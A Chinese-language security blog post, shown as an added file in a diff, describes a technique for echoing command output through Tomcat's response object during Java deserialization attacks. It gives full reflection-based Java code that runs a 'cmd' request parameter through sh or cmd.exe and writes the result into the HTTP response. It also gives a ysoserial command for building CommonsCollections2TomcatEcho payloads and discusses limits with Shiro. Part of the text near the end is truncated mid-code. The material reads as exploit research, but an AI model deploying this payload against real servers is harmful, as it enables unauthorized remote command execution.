@@ -1,0 +1,90 @@
+# 前言
+前段时间和@lufei 大哥学习了一波Linux下基于文件描述符的反序列化回显方式的思路。
+在自己实现的过程中发现，是通过IP和端口号的筛选，从而过滤出当前线程（也可以说是请求）的文件描述符，进而加入回显的内容。
+但是同时也有一个疑问，我们使用回显的目前主要是因为一些端口的过滤，一些内外网的隔离。从而将一些无法从别的途径传输的执行结果，通过http请求的方式，附加在原本的response中，从而绕过一些防护和限制。
+以个人的理解，在这种情况下，大概率会有一些负载均衡在真正的服务器前面，这样服务器中显示的ip和端口都会是LB的信息，这种筛选的方式也就失效了。
+当时的想法也是如果能直接获取到当前请求的response变量，直接write就可以了。但是对tomcat不是很熟悉，弄了个简易版适配Spring的就没后文了。
+最近又在社区中看到一个师傅发了这个Linux文件描述符的回显方式，评论处也提出了如果能直接获取response的效果会更好，于是就开始试着找了下如何获取tomcat的response变量。
+# 寻找过程
+这里起的是一个spring boot，先试着往Controller里面注入一个response
+为了确保我们获取到的response对象确实是tomcat的response，我们顺着堆栈一直往下。
+可以发现request和response几乎就是一路传递的，并且在内存中都是同一个变量（变量toString最后的数字就是当前变量的部分哈希）
+这样，就没有问题，只要我们能获取到这些堆栈中，任何一个类的response实例即可。
+接下来就是找哪里的response变量可以被我们获取，比较蛋疼的是，每个函数都是通过传参的方式传递的response和request。
+那这样的话，在这过程中request和response有没有在哪里被记录过，而且为了通用性，我们只应该寻找tomcat部分的代码，和spring相关的就可以不用看了。
+而且记录的变量不应该是一个全局变量，而应该是一个ThreadLocal，这样才能获取到当前线程的请求信息。而且最好是一个static静态变量，否则我们还需要去获取那个变量所在的实例。
+顺着这个思路，刚好在`org.apache.catalina.core.ApplicationFilterChain`这个类中，找到了一个符合要求的变量。
+而且很巧的是，刚好在处理我们Controller逻辑之前，有记录request和response的动作。
+虽然if条件是false，但是不要紧，我们有反射。
+这样，整体的思路大概就是
+1、反射修改`ApplicationDispatcher.WRAP_SAME_OBJECT`，让代码逻辑走到if条件里面
+2、初始化`lastServicedRequest`和`lastServicedResponse`两个变量，默认为null
+3、从`lastServicedResponse`中获取当前请求response，并且回显内容。
+写的过程中也学习了一下怎么通过反射修改一个private final的变量，还踩了一些坑，总之直接放上最后的代码
+    Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
+    Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
+    Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
+    Field modifiersField = Field.class.getDeclaredField("modifiers");
+    modifiersField.setAccessible(true);
+    modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
+    modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
+    modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
+    WRAP_SAME_OBJECT_FIELD.setAccessible(true);
+    lastServicedRequestField.setAccessible(true);
+    lastServicedResponseField.setAccessible(true);
+    ThreadLocal lastServicedResponse =
+        (ThreadLocal) lastServicedResponseField.get(null);
+    ThreadLocal lastServicedRequest = (ThreadLocal) lastServicedRequestField.get(null);
+    boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
+    String cmd = lastServicedRequest != null
+        ? lastServicedRequest.get().getParameter("cmd")
+        : null;
+    if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
+        lastServicedRequestField.set(null, new ThreadLocal<>());
+        lastServicedResponseField.set(null, new ThreadLocal<>());
+        WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
+    } else if (cmd != null) {
+        ServletResponse responseFacade = lastServicedResponse.get();
+        responseFacade.getWriter();
+        java.io.Writer w = responseFacade.getWriter();
+        Field responseField = ResponseFacade.class.getDeclaredField("response");
+        responseField.setAccessible(true);
+        Response response = (Response) responseField.get(responseFacade);
+        Field usingWriter = Response.class.getDeclaredField("usingWriter");
+        usingWriter.setAccessible(true);
+        usingWriter.set((Object) response, Boolean.FALSE);
+        boolean isLinux = true;
+        String osTyp = System.getProperty("os.name");
+        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+            isLinux = false;
+        }
+        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
+        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+        Scanner s = new Scanner(in).useDelimiter("\\a");
+        String output = s.hasNext() ? s.next() : "";
+        w.write(output);
+        w.flush();
+    }
+原本Contorller代码的逻辑是输出input部分的内容，我们所做的就是在原本的输出内容前面，添加cmd参数执行之后的结果。
+需要刷新两次的原因是因为第一次只是通过反射去修改值，这样在之后的运行中就会cache我们的请求，从而也就能获取到response。
+# 加入ysoserial
+这样，这样只要稍加改造一下，擦去泛型的部分，用完整的类名代替原本的类名，就可以放入到ysoserial中。
+中间莫名又踩了一些坑，嫌麻烦的师傅可以直接用已经改好的版本。
+ysoserial的第二个参数是要执行的命令，由于这里可以直接从request获取，自由度更大，所以我将第二个参数改成了要执行的命令的param。
+以`CommonsCollections2`为例，如下的方式就相当于创建了一个从cmd参数获取要执行的命令的payload。
+    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2TomcatEcho cmd
+测试一下别的tomcat环境，以jsp为例，确保有`commons-collections4`的依赖
+然后自己构造一个反序列化的环境
+可以看到内容成功的追加到了输出的body中。
+# 一些局限性
+回到标题，为什么是一个半通用的方法呢？
+当时构造好了之后兴匆匆的跑了一波shiro的反序列化，死活不成功，debug了很久之后发现了一个问题。
+shiro的rememberMe功能，其实是shiro自己实现的一个filter
+在`org.apache.catalina.core.ApplicationFilterChain`的`internalDoFilter`中(省略一些无用的代码)
+    if (pos 
+  * CommonsCollections2TomcatEcho
+  * CommonsCollections3TomcatEcho
+  * CommonsCollections4TomcatEcho
+感觉也不仅限于反序列化吧，一些拥有java代码执行的场景都通过这种方式，实现Tomcat的回显。
+比较蛋疼的一点就是一些filter中执行的代码不适用，就很可能不适用于很多框架型的漏洞，但是对于开发人员写的Controller中的场景应该都是可以的。
+技术比较菜，如果有师傅发现了更好的利用方式，或者一些文章中的疏漏，都可以一起探讨。
